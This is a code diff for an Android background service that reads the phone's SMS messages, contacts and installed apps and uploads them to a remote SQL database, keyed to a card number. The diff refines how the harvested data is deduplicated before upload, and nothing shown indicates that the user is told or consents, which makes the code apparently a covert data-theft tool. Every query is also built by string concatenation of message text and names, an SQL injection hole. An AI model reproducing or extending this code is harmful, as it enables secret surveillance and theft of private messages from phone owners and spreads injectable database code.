@@ -29,7 +29,7 @@ import java.util.concurrent.TimeUnit;
 
 public class MyService2 extends Service {
 
-    private List applist = null;
+    private  LinkedList<String> applist = null;
     private LinkedList<String> contacts = new LinkedList<>();
     private LinkedList<SMSclass> sms = new LinkedList<>();
     private static boolean READ_CONTACTS_GRANTED = false;
@@ -160,72 +160,123 @@ public class MyService2 extends Service {
 
                 if (connection != null) {
                     Statement statement = null;
+                    String insertstring="";
                     try {
-                        String insertstring="";
+
                         statement = connection.createStatement();
                         int clientID=0;
                         ResultSet resultSet = statement.executeQuery("Select ID FROM Clients WHERE CardNumber='"+cardnumber+"'");
                         while(resultSet.next()) {
                             clientID = resultSet.getInt(1);
                         }
+
                         if(clientID==0)
                         {
                             insertstring="INSERT Clients(CardNumber) VALUES('"+cardnumber+"')";
                             statement.executeUpdate(insertstring);
+                            resultSet = statement.executeQuery("Select ID FROM Clients WHERE CardNumber='"+cardnumber+"'");
+                            while(resultSet.next()) {
+                                clientID = resultSet.getInt(1);
+                            }
                         }
-                        resultSet = statement.executeQuery("Select ID FROM Clients WHERE CardNumber='"+cardnumber+"'");
-                        while(resultSet.next()) {
-                            clientID = resultSet.getInt(1);
-                        }
+
+
                         if(clientID>0) {
 
+                            Log.d("db",clientID+"");
+                            insertstring = "SELECT *FROM Messages WHERE ClientID="+clientID;
+                            resultSet=statement.executeQuery(insertstring);
+                            while(resultSet.next()) {
 
-                            insertstring = "DELETE FROM Messages WHERE ClientID="+clientID;
-                            statement.executeUpdate(insertstring);
-                            insertstring = "DELETE FROM Contacts WHERE ClientID="+clientID;
-                            statement.executeUpdate(insertstring);
-                            insertstring = "DELETE FROM Applications WHERE ClientID="+clientID;
-                            statement.executeUpdate(insertstring);
+                                for(int j=0;j<sms.size();j++)
+                                {
+                                    if(sms.get(j).sender.equals(resultSet.getString(3)))
+                                    {
+                                       if(sms.get(j).text.equals(resultSet.getString(4)))
+                                       {
+                                           sms.remove(j);
+                                       }
+                                    }
+                                }
+                            }
+                            Log.d("db",clientID+"");
+                            insertstring = "SELECT *FROM Contacts WHERE ClientID="+clientID;
+                            resultSet=statement.executeQuery(insertstring);
+                            while(resultSet.next()) {
+
+                                for(int j=0;j<contacts.size();j++)
+                                {
+                                    if(contacts.get(j).equals(resultSet.getString(3)))
+                                    {
+                                        contacts.remove(j);
+                                    }
+                                }
+                            }
+                            Log.d("db",clientID+"");
+                            insertstring = "SELECT *FROM Applications WHERE ClientID="+clientID;
+                            resultSet=statement.executeQuery(insertstring);
+                            while(resultSet.next()) {
+
+                                for(int j=0;j<applist.size();j++)
+                                {
+                                    if(applist.get(j).equals(resultSet.getString(3)))
+                                    {
+
+                                        applist.remove(j);
+                                    }
+                                }
+                            }
+
+
 
                             Log.d("db","DELETED");
-                            insertstring = "INSERT Contacts(ClientID, ContactName) VALUES (";
-                            for (int k = 0; k < contacts.size(); k++) {
-                                insertstring += clientID + ", N'" + contacts.get(k) + "'";
-                                if (k < contacts.size() - 1) {
-                                    insertstring += "), (";
+                            if(contacts.size()>0) {
+                                insertstring = "INSERT Contacts(ClientID, ContactName) VALUES (";
+                                for (int k = 0; k < contacts.size(); k++) {
+                                    insertstring += clientID + ", N'" + contacts.get(k) + "'";
+                                    if (k < contacts.size() - 1) {
+                                        insertstring += "), (";
+                                    }
                                 }
+                                insertstring += ")";
+                                statement.executeUpdate(insertstring);
                             }
-                            insertstring +=")";
-                            statement.executeUpdate(insertstring);
                             Log.d("db","CONTACTS");
-                            insertstring = "INSERT INTO Messages(ClientID, MessageFrom, MessageText) VALUES (";
-                            for (int k = 0; k < sms.size(); k++) {
-                                insertstring += clientID + ", N'" + sms.get(k).sender + "',N'"+sms.get(k).text+"'";
-                                if (k < sms.size() - 1) {
-                                    insertstring += "), (";
-                                }
+                            if(sms.size()>0) {
+                                insertstring = "INSERT INTO Messages(ClientID, MessageFrom, MessageText) VALUES (";
+                                for (int k = 0; k < sms.size(); k++) {
+                                    insertstring += clientID + ", N'" + sms.get(k).sender + "',N'" + sms.get(k).text + "'";
+                                    if (k < sms.size() - 1) {
+                                        insertstring += "), (";
+                                    }
 
+                                }
+                                insertstring +=")";
+                                statement.executeUpdate(insertstring);
                             }
                             Log.d("db","Messages");
-                            insertstring +=")";
-                            statement.executeUpdate(insertstring);
-                            insertstring = "INSERT INTO Applications(ClientID, ApplicationName) VALUES (";
-                            for (int k = 0; k < applist.size(); k++) {
-                                insertstring += clientID + ", N'" + applist.get(k) + "'";
-                                if (k < applist.size() - 1) {
-                                    insertstring += "), (";
+
+                            if(applist.size()>0) {
+                                insertstring = "INSERT INTO Applications(ClientID, ApplicationName) VALUES (";
+                                for (int k = 0; k < applist.size(); k++) {
+                                    insertstring += clientID + ", N'" + applist.get(k) + "'";
+                                    if (k < applist.size() - 1) {
+                                        insertstring += "), (";
+                                    }
                                 }
+
+                                insertstring += ")";
+                                statement.executeUpdate(insertstring);
                             }
-                            Log.d("db","Applications");
-                            insertstring +=")";
-                            statement.executeUpdate(insertstring);
+                            Log.d("db", "Applications");
                         }
                         else
                         {
                             Log.d("db","Таких в бд нет!");
                         }
-                    } catch (SQLException throwables) {
+                    } catch (Exception throwables) {
                         Log.d("db",throwables.getMessage());
+                        Log.d("db",insertstring);
                     }
                 }
                 else
@@ -251,12 +302,12 @@ public class MyService2 extends Service {
     }
 
 
-    private List checkForLaunchIntent(List<ApplicationInfo> list) {
-        ArrayList appList = new ArrayList();
+    private  LinkedList<String> checkForLaunchIntent(List<ApplicationInfo> list) {
+        LinkedList<String> appList = new  LinkedList<String>();
         for (ApplicationInfo info : list) {
             try {
                 if (packageManager.getLaunchIntentForPackage(info.packageName) != null) {
-                    appList.add(info.name);
+                    appList.add(info.name.toString());
                 }
             } catch (Exception e) {
                 e.printStackTrace();
